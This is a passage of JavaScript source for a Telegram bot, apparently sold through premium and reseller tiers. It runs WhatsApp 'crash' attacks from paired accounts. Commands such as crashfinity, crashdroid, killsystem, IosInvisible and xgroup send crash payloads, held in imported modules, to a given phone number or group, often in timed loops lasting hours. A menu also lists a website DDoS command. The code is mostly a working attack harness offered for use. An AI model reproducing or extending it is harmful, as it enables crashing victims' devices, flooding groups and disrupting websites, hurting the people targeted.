                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/delresell ID</code>`, { parse_mode: 'HTML' });
            const db = getDB();
            if (!db.resellers.includes(targetId))
                return S7.sendMessage(chatId, `${E.think} <b>User is not a Reseller.</b>`, { parse_mode: 'HTML' });
            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `${E.check} ID <code>${targetId}</code> removed from <b>Resellers</b>. ${E.devil}`, { parse_mode: 'HTML' });
        });

        // ─── LIST RESELL ──────────────────────────────
        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (Number(chatId) !== Number(config.adminId))
                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const db = getDB();
            if (!db.resellers.length)
                return S7.sendMessage(chatId, `${E.think} <b>No resellers found.</b>`, { parse_mode: 'HTML' });
            let text = `${E.chart} <b>Reseller List:</b>\n\n`;
            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user  = await S7.getChat(id);
                    const uname = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${uname}<code>${id}</code>\n`;
                } catch (_) { text += `${i + 1}. <code>${id}</code>\n`; }
            }
            text += `\n──────────────────`;
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        // ─── ADD PREM ─────────────────────────────────
        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const db = getDB();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId.toString() && !db.resellers.includes(chatId))
                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/addprem ID</code>`, { parse_mode: 'HTML' });
            if (db.premium.includes(targetId))
                return S7.sendMessage(chatId, `${E.think} <b>User is already Premium.</b>`, { parse_mode: 'HTML' });
            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `${E.star} ID <code>${targetId}</code> added to <b>Premium</b>. ${E.check}`, { parse_mode: 'HTML' });
        });

        // ─── DEL PREM ─────────────────────────────────
        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const db = getDB();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId.toString() && !db.resellers.includes(chatId))
                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/delprem ID</code>`, { parse_mode: 'HTML' });
            if (!db.premium.includes(targetId))
                return S7.sendMessage(chatId, `${E.think} <b>User is not Premium.</b>`, { parse_mode: 'HTML' });
            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `${E.check} ID <code>${targetId}</code> removed from <b>Premium</b>. ${E.devil}`, { parse_mode: 'HTML' });
        });

        // ─── CRASHFINITY ──────────────────────────────
        SYLoVe('crashfinity', async (msg) => {
            const chatId    = msg.chat.id.toString();
            const userId    = msg.from.id.toString();
            const targetNum = msg.text.split(' ')[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || !waSessions[chatId].length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            if (!targetNum)
                return S7.sendMessage(chatId, `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/crashfinity +999999999999</code>`, { parse_mode: 'HTML' });
            const cleanTarget   = targetNum.replace(/[^0-9]/g, '');
            const targetJid     = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client        = randomSession.sock;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `${E.devil} <b>This Number isn't on WhatsApp</b>`, { parse_mode: 'HTML' });
                log('command', msg.from.first_name, `crashfinity on ${cleanTarget} via ${randomSession.num}`);
                if (typeof CrashLogic.crashfinity !== 'function') throw new Error('Function not found in crashfinity.js');
                const r = await safeRelay(() => CrashLogic.crashfinity(client, targetJid));
                if (!r.ok) throw new Error(r.err);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
            } catch (err) {
                log('error', 'crashfinity', err.message);
                S7.sendMessage(chatId, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── XGROUP / GROUPMIX / NULLGC / GROUPUI ────
        SYLoVe(['xgroup', 'groupmix', 'nullgc', 'groupui'], async (msg) => {
            try {
                const chatId      = msg.chat.id.toString();
                const userId      = msg.from.id.toString();
                const args        = msg.text.split(' ');
                const s7CM        = args[0].slice(1);
                const targetNum   = args[1];
                const durationArg = args[2];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!waSessions[chatId] || !waSessions[chatId].length)
                    return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
                if (!targetNum || !durationArg)
                    return S7.sendMessage(chatId, `${E.devil} <b>Provide GC jid and Duration.</b>\nExample: <code>/${s7CM} 1236xxx@g.us 1</code>`, { parse_mode: 'HTML' });
                if (!targetNum.endsWith('@g.us'))
                    return S7.sendMessage(chatId, `${E.devil} <b>Invalid group JID</b>`, { parse_mode: 'HTML' });
                if (isNaN(durationArg))
                    return S7.sendMessage(chatId, `${E.devil} <b>Duration must be a number (Hours)</b>`, { parse_mode: 'HTML' });
                const targetJid     = targetNum.trim();
                const hours         = parseInt(durationArg);
                const durationMs    = hours * 3600000;
                const loopStart     = Date.now();
                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client        = randomSession.sock;
                log('command', msg.from.first_name, `${s7CM} on ${targetJid} for ${hours}h via ${randomSession.num}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
                let attackCount = 0;
                while ((Date.now() - loopStart) < durationMs) {
                    if (!isSocketAlive(client)) { log('error', s7CM, 'Socket dead — stopping loop'); break; }
                    if (typeof XgcLogic.Xgc === 'function') {
                        const r = await safeRelay(() => XgcLogic.Xgc(client, targetJid));
                        if (!r.ok) { log('error', s7CM, r.err); await new Promise(res => setTimeout(res, 3000)); continue; }
                        attackCount++;
                        if (attackCount % 3 === 0) await new Promise(res => setTimeout(res, getRandomDelay(8000, 15000)));
                    }
                    await new Promise(res => setTimeout(res, 2000));
                }
            } catch (err) {
                log('error', 'xgroup', err.message);
                S7.sendMessage(msg.chat.id, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── CRASHDROID / NULLFINITY / KILLSYSTEM ────
        SYLoVe(['crashdroid', 'nullfinity', 'killsystem'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args   = msg.text.split(' ');
            const s7CM   = args[0].slice(1);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || !waSessions[chatId].length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            if (args.length < 3)
                return S7.sendMessage(chatId, `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/${s7CM} +999999999999 1</code>`, { parse_mode: 'HTML' });
            const cleanTarget   = args[1].replace(/[^0-9]/g, '');
            const targetJid     = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client        = randomSession.sock;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `${E.devil} <b>This Number isn't on WhatsApp</b>`, { parse_mode: 'HTML' });
                log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${randomSession.num}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
                const delayFn = ms => new Promise(r => setTimeout(r, ms));
                if (args[2] === 'only') {
                    const maxCount = Math.min(parseInt(args[3]) || 0, 5);
                    if (!maxCount) return S7.sendMessage(chatId, `${E.devil} <b>Invalid count value</b>`, { parse_mode: 'HTML' });
                    for (let i = 0; i < maxCount; i++) {
                        if (!isSocketAlive(client)) break;
                        const r = await safeRelay(() => CallLogic.CallCrash(client, targetJid));
                        if (!r.ok) log('error', s7CM, r.err);
                        if (i < maxCount - 1) await delayFn(getRandomDelay(5000, 15000));
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, `${E.devil} <b>Invalid time value</b>`, { parse_mode: 'HTML' });
                    const endTime = Date.now() + hours * 3600000;
                    let attackCount = 0;
                    while (Date.now() < endTime) {
                        if (!isSocketAlive(client)) { log('error', s7CM, 'Socket dead — stopping loop'); break; }
                        const r = await safeRelay(() => CallLogic.CallCrash(client, targetJid));
                        if (!r.ok) { log('error', s7CM, r.err); await delayFn(3000); continue; }
                        attackCount++;
                        if (attackCount % 5 === 0) await delayFn(getRandomDelay(5000, 10000));
                        else await delayFn(2000);
                    }
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── TEST ─────────────────────────────────────
        SYLoVe('test', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args   = msg.text.split(' ');
            const s7CM   = args[0].slice(1);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || !waSessions[chatId].length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            if (args.length < 3)
                return S7.sendMessage(chatId, `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/${s7CM} +999999999999 1</code>`, { parse_mode: 'HTML' });
            const cleanTarget   = args[1].replace(/[^0-9]/g, '');
            const targetJid     = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client        = randomSession.sock;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `${E.devil} <b>This Number isn't on WhatsApp</b>`, { parse_mode: 'HTML' });
                log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${randomSession.num}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
                const delayFn = ms => new Promise(r => setTimeout(r, ms));
                if (args[2] === 'only') {
                    const maxCount = Math.min(parseInt(args[3]) || 0, 5);
                    if (!maxCount) return S7.sendMessage(chatId, `${E.devil} <b>Invalid count value</b>`, { parse_mode: 'HTML' });
                    for (let i = 0; i < maxCount; i++) {
                        if (!isSocketAlive(client)) break;
                        const r = await safeRelay(() => testlogic.test(client, targetJid));
                        if (!r.ok) log('error', s7CM, r.err);
                        if (i < maxCount - 1) await delayFn(getRandomDelay(5000, 10000));
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, `${E.devil} <b>Invalid time value</b>`, { parse_mode: 'HTML' });
                    const endTime = Date.now() + hours * 3600000;
                    let attackCount = 0;
                    while (Date.now() < endTime) {
                        if (!isSocketAlive(client)) { log('error', s7CM, 'Socket dead — stopping loop'); break; }
                        const r = await safeRelay(() => testlogic.test(client, targetJid), 15000);
                        if (!r.ok) { log('error', s7CM, `Attack failed: ${r.err}`); await delayFn(3000); continue; }
                        attackCount++;
                        if (attackCount % 4 === 0) await delayFn(getRandomDelay(8000, 12000));
                        else await delayFn(2000);
                    }
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── IOS INVISIBLE / HIDENSEEK ────────────────
        SYLoVe(['IosInvisible', 'IosInvisiblexi', 'IosInvisiblex', 'hidenseek'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args   = msg.text.split(' ');
            const s7CM   = args[0].slice(1);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || !waSessions[chatId].length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            if (args.length < 3)
                return S7.sendMessage(chatId, `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/${s7CM} +999999999999 1</code>`, { parse_mode: 'HTML' });
            const cleanTarget   = args[1].replace(/[^0-9]/g, '');
            const targetJid     = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client        = randomSession.sock;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `${E.devil} <b>This Number isn't on WhatsApp</b>`, { parse_mode: 'HTML' });
                log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${randomSession.num}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
                const delayFn = ms => new Promise(r => setTimeout(r, ms));
                if (args[2] === 'only') {
                    const maxCount = Math.min(parseInt(args[3]) || 0, 5);
                    if (!maxCount) return S7.sendMessage(chatId, `${E.devil} <b>Invalid count value</b>`, { parse_mode: 'HTML' });
                    for (let i = 0; i < maxCount; i++) {
                        if (!isSocketAlive(client)) break;
                        const r = await safeRelay(() => IosLogic.IosInvisible(client, targetJid));
                        if (!r.ok) log('error', s7CM, r.err);
                        if (i < maxCount - 1) await delayFn(getRandomDelay(5000, 10000));
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, `${E.devil} <b>Invalid time value</b>`, { parse_mode: 'HTML' });
                    const endTime = Date.now() + hours * 3600000;
                    let attackCount = 0;
                    while (Date.now() < endTime) {
                        if (!isSocketAlive(client)) { log('error', s7CM, 'Socket dead — stopping loop'); break; }
                        const r = await safeRelay(() => IosLogic.IosInvisible(client, targetJid));
                        if (!r.ok) { log('error', s7CM, r.err); await delayFn(2000); continue; }
                        attackCount++;
                        if (attackCount % 5 === 0) await delayFn(getRandomDelay(8000, 15000));
                        else await delayFn(500);
                    }
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── DELAY XCEED ──────────────────────────────
        SYLoVe('delayxceed', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args   = msg.text.split(' ');
            const s7CM   = args[0].slice(1);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || !waSessions[chatId].length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            if (args.length < 3)
                return S7.sendMessage(chatId, `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/${s7CM} +999999999999 1</code>`, { parse_mode: 'HTML' });
            const cleanTarget   = args[1].replace(/[^0-9]/g, '');
            const targetJid     = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client        = randomSession.sock;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `${E.devil} <b>This Number isn't on WhatsApp</b>`, { parse_mode: 'HTML' });
                log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${randomSession.num}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
                const delayFn = ms => new Promise(r => setTimeout(r, ms));
                if (args[2] === 'only') {
                    const maxCount = Math.min(parseInt(args[3]) || 0, 5);
                    if (!maxCount) return S7.sendMessage(chatId, `${E.devil} <b>Invalid count value</b>`, { parse_mode: 'HTML' });
                    for (let i = 0; i < maxCount; i++) {
                        if (!isSocketAlive(client)) break;
                        const r = await safeRelay(() => XLogic.Xdelay(client, targetJid));
                        if (!r.ok) log('error', s7CM, r.err);
                        if (i < maxCount - 1) await delayFn(getRandomDelay(5000, 10000));
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, `${E.devil} <b>Invalid time value</b>`, { parse_mode: 'HTML' });
                    const endTime = Date.now() + hours * 3600000;
                    let attackCount = 0;
                    while (Date.now() < endTime) {
                        if (!isSocketAlive(client)) { log('error', s7CM, 'Socket dead — stopping loop'); break; }
                        const r = await safeRelay(() => XLogic.Xdelay(client, targetJid));
                        if (!r.ok) { log('error', s7CM, r.err); await delayFn(2000); continue; }
                        attackCount++;
                        if (attackCount % 5 === 0) await delayFn(getRandomDelay(8000, 15000));
                        else await delayFn(500);
                    }
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── LIST PREM ────────────────────────────────
        SYLoVe('listprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (Number(chatId) !== Number(config.adminId))
                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const db = getDB();
            if (!db.premium.length)
                return S7.sendMessage(chatId, `${E.think} <b>No premium users found.</b>`, { parse_mode: 'HTML' });
            let text = `${E.star} <b>Premium List:</b>\n\n`;
            for (let i = 0; i < db.premium.length; i++) {
                const id = db.premium[i].toString();
                try {
                    const user  = await S7.getChat(id);
                    const uname = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${uname}<code>${id}</code>\n`;
                } catch (_) { text += `${i + 1}. <code>${id}</code>\n`; }
            }
            text += `\n──────────────────`;
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        // ─── LIST GC ──────────────────────────────────
        SYLoVe('listgc', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions || !Object.keys(waSessions).length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            let text = '';
            let totalGroups = 0;
            let index = 1;
            for (const chatKey of Object.keys(waSessions)) {
                for (const session of waSessions[chatKey]) {
                    try {
                        const groups = Object.values(await session.sock.groupFetchAllParticipating());
                        if (!groups.length) continue;
                        text += `${E.spider} <b>Number:</b> <code>${session.num}</code>\n━━━━━━━━━━━━━━━\n`;
                        for (const group of groups) {
                            const meta = await session.sock.groupMetadata(group.id);
                            text += `${E.bolt}❏ <b>Group ${index++}</b>\n│${E.lips} <b>Name:</b> ${meta.subject}\n│${E.think} <b>ID:</b> <code>${meta.id}</code>\n│${E.green} <b>Members:</b> ${meta.participants.length}\n╰──────────────\n\n`;
                            totalGroups++;
                        }
                    } catch (err) { log('error', 'LISTGC', `Failed for ${session.num}: ${err.message}`); }
                }
            }
            if (!totalGroups)
                return S7.sendMessage(chatId, `${E.think} <b>No groups found on connected numbers.</b>`, { parse_mode: 'HTML' });
            text = `${E.chart} <b>LIST OF GROUPS</b>\n\n${E.skull} <b>Total:</b> <code>${totalGroups}</code>\n\n` + text;
            if (text.length > 4000) {
                const fp = './Love/listgc.txt';
                fs.writeFileSync(fp, text.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, fp);
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        // ─── STATE ────────────────────────────────────
        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const value  = msg.text.split(' ')[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (Number(chatId) !== Number(config.adminId))
                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            if (value !== '0' && value !== '1')
                return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/state 0</code> | <code>/state 1</code>`, { parse_mode: 'HTML' });
            const db = getDB();
            db.state = Number(value);
            saveDB(db);
            S7.sendMessage(chatId,
                value === '0'
                    ? `${E.green} <b>State → FREE MODE</b>\n${E.thumbs} All users allowed`
                    : `${E.skull} <b>State → PREMIUM ONLY MODE</b> ${E.devil}`,
                { parse_mode: 'HTML' }
            );
        });

        // ─── LIST USER ────────────────────────────────
        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (Number(chatId) !== Number(config.adminId))
                return S7.sendMessage(msg.chat.id, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile))
                return S7.sendMessage(msg.chat.id, `${E.think} <b>No users found.</b>`, { parse_mode: 'HTML' });
            const users = JSON.parse(fs.readFileSync(userFile, 'utf8'));
            let list = `${E.chart} <b>User List:</b>\n\n`;
            users.forEach((u, i) => { list += `${i + 1}. ${E.star2} <b>${u.name}</b> (<code>${u.id}</code>)\n`; });
            if (list.length > 4000) {
                const lp = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(lp, list.replace(/<[^>]*>/g, ''));
                S7.sendDocument(msg.chat.id, lp);
            } else {
                S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
            }
        });

        // ─── CALLBACK QUERY ───────────────────────────
        S7.on('callback_query', async (query) => {
            const chatId    = query.message.chat.id;
            const messageId = query.message.message_id;
            const data      = query.data;
            const userId    = query.from.id;
            const name      = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime    = getRuntime();
            const love      = userId.toString();

            const S7edit = (text, opts) =>
                S7.editMessageCaption(text, opts).catch(err => {
                    if (!err.message.includes('message is not modified')) log('error', 'SYSTEM', err.message);
                });

            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId);
                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId,
                        `${E.check} <b>Membership verified!</b>\nYou are a member of both channel and group.\nTry <code>/start</code> or <code>/reqpair</code>.`,
                        { parse_mode: 'HTML' }
                    );
                } else {
                    S7.answerCallbackQuery(query.id, { text: '❌ You have not joined both the Channel and Group yet!', show_alert: true });
                }
            }

            if (data === 'misc_menu') {
                const uid = query.from.id.toString();
                if (!LoveGlobalState(uid)) return sendSYLove(S7, chatId);
                const miscText =
                    MainSYLoVe(name, uptime, uid) +
                    `\n<blockquote>${E.drink}╔══════〔 ${E.star} 𝗠𝗜𝗦𝗖 𝗠𝗘𝗡𝗨 ${E.star} 〕══════╗\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.spider} 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗘𝗦𝗦𝗜𝗢𝗡\n` +
                    `║  ├─ /reqpair number\n` +
                    `║  ├─ /delpair number\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.think} 𝗧𝗢𝗞𝗘𝗡 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧\n` +
                    `║  ├─ /addtoken token\n` +
                    `║  ├─ /deltoken token\n` +
                    `║  ├─ /mytoken\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.star} 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧\n` +
                    `║  ├─ /addprem ID\n` +
                    `║  ├─ /delprem ID\n` +
                    `║  ├─ /listprem\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.chart} 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧\n` +
                    `║  ├─ /addresell ID\n` +
                    `║  ├─ /delresell ID\n` +
                    `║  ├─ /listresell\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.skull} 𝗢𝗧𝗛𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n` +
                    `║  ├─ /listuser\n` +
                    `║  ├─ /state 0 | 1\n` +
                    `╚══════════════════════════════╝</blockquote>`;
                S7edit(miscText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...Lovesbutton });
            }

            if (data === 'bug_menu') {
                const uid = query.from.id.toString();
                if (!LoveGlobalState(uid)) return sendSYLove(S7, chatId);
                const bugText =
                    MainSYLoVe(name, uptime, uid) +
                    `\n<blockquote>${E.devil}╔══════〔 ${E.skull} 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ${E.skull} 〕══════╗\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.ru} 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 𝗕𝗨𝗚𝗦\n` +
                    `║  ├─ /delayxceed num time\n` +
                    `║  ├─ /killsystem num time\n` +
                    `║  ├─ /crashfinity num time\n` +
                    `║  ├─ /nullfinity num time\n` +
                    `║  ├─ /crashdroid num time\n` +
                    `║  ├─ /test\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.cat} 𝗶𝗢𝗦 𝗕𝗨𝗚𝗦\n` +
                    `║  ├─ /hidenseek num time\n` +
                    `║  ├─ /IosInvisiblex num time\n` +
                    `║  ├─ /IosInvisiblexi num time\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.bolt} 𝗚𝗥𝗢𝗨𝗣 𝗕𝗨𝗚𝗦\n` +
                    `║  ├─ /xgroup groupid time\n` +
                    `║  ├─ /groupmix groupid time\n` +
                    `║  ├─ /nullgc groupid time\n` +
                    `║  ├─ /groupui groupid time\n` +
                    `║  ├─ /listgc\n` +
                    `╠══════════════════════════════╣\n` +
                    `║ ${E.spider} 𝗪𝗘𝗕 𝗕𝗨𝗚𝗦\n` +
                    `║  ├─ /xxddos weblink time\n` +
                    `╚══════════════════════════════╝</blockquote>`;
                S7edit(bugText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...Lovesbutton });
            }
        });


    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// ══════════════════════════════════════════════
//  START BOTS
// ══════════════════════════════════════════════
startSYloveBot(config.mainToken);

const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => startSYloveBot(obj.token));
} else {
    log('info', null, 'No extra bots found in database.');
}
